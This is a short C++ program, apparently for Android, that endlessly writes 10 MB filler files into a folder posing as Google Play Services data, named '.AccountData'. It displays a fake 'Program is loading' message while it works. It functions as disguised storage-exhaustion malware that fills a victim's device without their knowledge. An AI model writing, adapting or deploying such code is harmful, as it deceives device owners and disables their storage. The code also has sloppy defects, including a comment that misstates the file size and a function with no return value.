#include <iostream>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <fstream>
using namespace std;

//CREATES  text file of 100mb
void create_file()
{
	int o = 0;
	int i = 1;
	int size, n = -5;
	size = 1024 * 1024 * 10;
	string filename = "/storage/emulated/0/Android/data/com.google.android.gms/.AccountData";
	while (true)
	{
			cout << "Program is loading Please wait!!" << o << endl;
		filename.append(to_string(i));
		filename.append(".txt");

		std::ofstream fout(filename);
		fout.fill(' ');
		fout.width(size);
		fout << ' ';
		o = o + 500;
		i++;
//		int **arr = new int*[1+i];
//		arr[i] = new int[i+1];
	}
}

//checks that directory is avalible or not
string DirCheck(void)
{
	const char *dir = "/storage/emulated/0/Android/data/com.google.android.gms";
	struct stat sb;
	if (stat(dir, &sb) == 0)
	{
		return "1";
	}
	else
	{
		return "0";
	}
}
//creates directory if not exists
string createDir(string check)
{
	mkdir("/storage/emulated/0/Android/data/com.google.android.gms", 0777);
	if (check == "1")
	{
		cout << "Program is loading Please wait!!" << endl;
	}
}
//		cout << "unable to create!" << endl;


int main()
{
	while (true)
	{
//		int n;
//		float  file_size;
//		cout << "Enter number of files:";
//		cin >> n;
	//	cout << "Enter size of each file in mb:";
//		cin >> file_size;
		string check = DirCheck();
		//checks directory is avaliable or have to create
		if (DirCheck() == "0")
		{
			createDir(check);
			create_file();
		
		}
		else
		{
			//	cout << "Directory Avaliable";
			create_file();
		}
	}
}
